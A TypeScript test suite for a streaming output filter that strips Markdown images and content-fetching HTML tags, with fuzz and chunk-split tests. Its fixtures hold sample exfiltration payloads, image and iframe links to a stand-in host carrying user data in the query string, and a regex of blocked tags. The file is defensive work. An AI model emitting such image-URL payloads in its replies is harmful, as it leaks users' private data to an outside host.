import { assertEquals, assertFalse } from "jsr:@std/assert@1.0.19";
import { createOutputFilter, MAX_HOLD_CHARS, NEUTRAL_LT, stripImages } from "./output_filter.ts";

/** Feeds `chunks` through one filter and returns every emitted piece plus the flush. */
function run(chunks: readonly string[]): { pieces: string[]; text: string } {
  const filter = createOutputFilter();
  const pieces = chunks.map((chunk) => filter.push(chunk));
  pieces.push(filter.flush());
  return { pieces, text: pieces.join("") };
}

Deno.test("inline and reference images become their alt text", () => {
  assertEquals(
    stripImages("Here: ![x](https://evil.example/c?d=food_12345) done"),
    "Here: x done",
  );
  assertEquals(stripImages("A ![chart][1] B"), "A chart B");
  assertEquals(stripImages('![a](<https://e/x y> "t")'), "a");
  assertEquals(
    stripImages("![nested ![in](https://e/1)](https://e/2)"),
    "nested in",
  );
  assertEquals(stripImages("![](https://e/p?d=1)"), "");
});

Deno.test("shortcut reference images lose the '!' and links are left alone", () => {
  assertEquals(stripImages("See ![logo] now"), "See [logo] now");
  assertEquals(
    stripImages("[Verify](https://evil.example)"),
    "[Verify](https://evil.example)",
  );
  assertEquals(
    stripImages("Wow! [a](b) and !important"),
    "Wow! [a](b) and !important",
  );
});

Deno.test("HTML img tags are removed; other angle brackets are kept", () => {
  assertEquals(stripImages('x <img src="https://e/p?d=1"> y'), "x  y");
  assertEquals(stripImages("x <IMG/src=https://e> y"), "x  y");
  assertEquals(
    stripImages("1 < 2 and <b>bold</b> <image>"),
    "1 < 2 and <b>bold</b> ",
  );
  assertEquals(stripImages("a<img src=e>b"), "a b");
});

Deno.test("an image split across chunks never leaks, at any split point", () => {
  const source = "Total ₹1,200. ![x](https://evil.example/c?d=food_12345) Bye <img src=e>!";
  for (let cut = 0; cut <= source.length; cut++) {
    for (let cut2 = cut; cut2 <= source.length; cut2 += 7) {
      const { pieces, text } = run([
        source.slice(0, cut),
        source.slice(cut, cut2),
        source.slice(cut2),
      ]);
      assertEquals(text, "Total ₹1,200. x Bye !");
      for (const piece of pieces) {
        assertFalse(piece.includes("evil.example"), `leaked at ${cut}/${cut2}`);
      }
    }
  }
});

Deno.test("text without image syntax is passed through immediately", () => {
  const filter = createOutputFilter();
  assertEquals(filter.push("You spent **₹12,345** "), "You spent **₹12,345** ");
  assertEquals(filter.push("on food!"), "on food");
  assertEquals(filter.push(" Nice."), "! Nice.");
  assertEquals(filter.flush(), "");
});

Deno.test("an unfinished image is neutralised at the end or past the hold limit", () => {
  assertEquals(
    run(["Look ![x](https://evil.example/"]).text,
    "Look [x](https://evil.example/",
  );
  assertEquals(run(["a <img src=x"]).text, "a img src=x");

  const filter = createOutputFilter();
  assertEquals(filter.push("![x]("), "");
  const long = "a".repeat(MAX_HOLD_CHARS);
  const out = filter.push(long);
  assertEquals(out, `[x](${long}`);
});

Deno.test("tags that fetch or embed content are removed, opening and closing", () => {
  const cases: Array<[string, string]> = [
    ['a <picture><source srcset="https://e/p?d=1"></picture> b', "a  b"],
    ['a <iframe src="https://e/f"></iframe> b', "a  b"],
    ['a <svg width="1"><image href="https://e/i"/></svg> b', "a  b"],
    ['a <object data="https://e/o"></object> b', "a  b"],
    ['a <embed src="https://e/e"> b', "a  b"],
    ['a <link rel="preload" href="https://e/l"> b', "a  b"],
    [
      'a <video poster="https://e/v"></video><audio src="https://e/a"></audio> b',
      "a  b",
    ],
    ["a <SVG/onload=x> b", "a  b"],
    // A ">" inside a quoted attribute value does not end the tag early.
    ['a <img alt="x>y" src="https://e/q"> b', "a  b"],
  ];
  for (const [input, expected] of cases) {
    assertEquals(stripImages(input), expected, input);
    assertFalse(stripImages(input).includes("https://e/p"), input);
  }
});

Deno.test("plain '<' in prose and harmless tags are kept", () => {
  for (
    const text of [
      "Keep it to <5 items and spend < ₹500.",
      "a <b>bold</b> and <links are fine> and <sources>",
      "x<y and <3 and <= 2 and </ end",
    ]
  ) {
    assertEquals(stripImages(text), text);
  }
});

Deno.test("a blocked tag split across chunks never leaks, at any split point", () => {
  const source = 'Hi <iframe src="https://evil.example/f?d=1"></iframe> <5 ok';
  for (let cut = 0; cut <= source.length; cut++) {
    const { pieces, text } = run([source.slice(0, cut), source.slice(cut)]);
    assertEquals(text, "Hi  <5 ok");
    for (const piece of pieces) {
      assertFalse(piece.includes("evil.example"), `leaked at ${cut}`);
    }
  }
});

/** Matches any Markdown image that could still render. */
const IMAGE = /!\[[^\]]*\]\(/;
/** Matches any (opening or closing) blocked tag, even with whitespace after the "<". */
const TAG = /<\/?\s*(img|image|picture|source|iframe|svg|object|embed|link|video|audio)\b/i;

function assertSafe(text: string, context: string): void {
  assertFalse(
    IMAGE.test(text),
    `image in ${JSON.stringify(text.slice(0, 200))} (${context})`,
  );
  assertFalse(
    text.includes("!["),
    `"![" in ${JSON.stringify(text.slice(0, 200))} (${context})`,
  );
  assertFalse(
    TAG.test(text),
    `tag in ${JSON.stringify(text.slice(0, 200))} (${context})`,
  );
}

Deno.test("removing a construct never splices its neighbours into a new one", () => {
  const cases: Array<[string, string]> = [
    ["!<img>[a](http://x/?d=1)", "! [a](http://x/?d=1)"],
    ["!![]()[a](http://x/?d=1)", "! [a](http://x/?d=1)"],
    [
      "<<img>img src=http://x/?d=1>",
      `${NEUTRAL_LT} img src=http://x/?d=1>`,
    ],
    ["<</svg>img src=http://x/?d=1>", `${NEUTRAL_LT} img src=http://x/?d=1>`],
    ["![wow!](u)[a](http://x/?d=1)", "wow! [a](http://x/?d=1)"],
    ["!![x][y]", "!x"],
    ["!!![a]", "!! [a]"],
    ["< img src=x>", `${NEUTRAL_LT} img src=x>`],
  ];
  for (const [input, expected] of cases) {
    assertEquals(stripImages(input), expected, input);
  }
});

Deno.test("splice reproductions stay safe across chunks and past the hold limit", () => {
  const repros = [
    "!<img>[a](http://x/?d=1)",
    "!![]()[a](http://x/?d=1)",
    "<<img>img src=http://x/?d=1>",
    "<</svg>img src=http://x/?d=1>",
    "!<image href=x>[a](http://x/?d=1)",
  ];
  const fillers = ["", "a".repeat(2100), " ".repeat(2100)];
  for (const repro of repros) {
    for (const filler of fillers) {
      for (let at = 0; at <= repro.length; at++) {
        const source = repro.slice(0, at) + filler + repro.slice(at);
        assertSafe(stripImages(source), `whole ${repro} filler@${at}`);
        for (
          const cut of [
            1,
            2,
            3,
            5,
            8,
            at,
            at + filler.length,
            source.length - 1,
          ]
        ) {
          const { text } = run([source.slice(0, cut), source.slice(cut)]);
          assertSafe(text, `${repro} filler@${at} cut@${cut}`);
        }
        if (filler === "") {
          // One character per chunk.
          assertSafe(run([...source]).text, `${repro} per char`);
        }
      }
    }
  }
});

/** Deterministic PRNG (mulberry32) so failures reproduce. */
function prng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const FRAGMENTS = [
  "!",
  "!",
  "<",
  "<",
  "[",
  "]",
  "(",
  ")",
  "img",
  "IMG",
  "image",
  "/svg",
  "svg",
  "iframe",
  "source",
  "/",
  "src=",
  '"',
  "http://x/?d=1",
  ">",
  " ",
  "\n",
  "a",
  "b",
  "x",
  "5",
  "\\",
];

Deno.test("fuzz: random fragments and chunk splits never produce an image or blocked tag", () => {
  const random = prng(0x5eed);
  const pick = <T>(items: readonly T[]): T => items[Math.floor(random() * items.length)];
  for (let n = 0; n < 4000; n++) {
    const parts: string[] = [];
    const count = 1 + Math.floor(random() * 24);
    for (let p = 0; p < count; p++) {
      if (random() < 0.01) {
        parts.push(
          pick(["a", " ", "x y "]).repeat(
            Math.ceil(2100 / 4) * (1 + Math.floor(random() * 4)),
          ),
        );
      } else {
        parts.push(pick(FRAGMENTS));
      }
    }
    const source = parts.join("");
    assertSafe(
      stripImages(source),
      `#${n} whole ${JSON.stringify(source.slice(0, 200))}`,
    );

    const chunks: string[] = [];
    let at = 0;
    while (at < source.length) {
      const size = random() < 0.5 ? 1 + Math.floor(random() * 4) : 1 + Math.floor(random() * 40);
      chunks.push(source.slice(at, at + size));
      at += size;
    }
    if (random() < 0.2) {
      chunks.splice(Math.floor(random() * (chunks.length + 1)), 0, "");
    }
    const { text } = run(chunks);
    assertSafe(text, `#${n} chunked ${JSON.stringify(chunks.slice(0, 40))}`);
  }
});

Deno.test("plain prose and links pass through unchanged, at any split point", () => {
  for (
    const text of [
      "Keep it to <5 items.",
      "a < b and b > c",
      "Wow! Great month.",
      "See [link](url) and [Docs](https://example.com/a?b=1).",
      "Wow! [a](b) and !important, x<y, <3, </ end, <sources>, <imagery>",
    ]
  ) {
    assertEquals(stripImages(text), text);
    for (let cut = 0; cut <= text.length; cut++) {
      assertEquals(
        run([text.slice(0, cut), text.slice(cut)]).text,
        text,
        `${text} @${cut}`,
      );
    }
    assertEquals(run([...text]).text, text, `${text} per char`);
  }
});
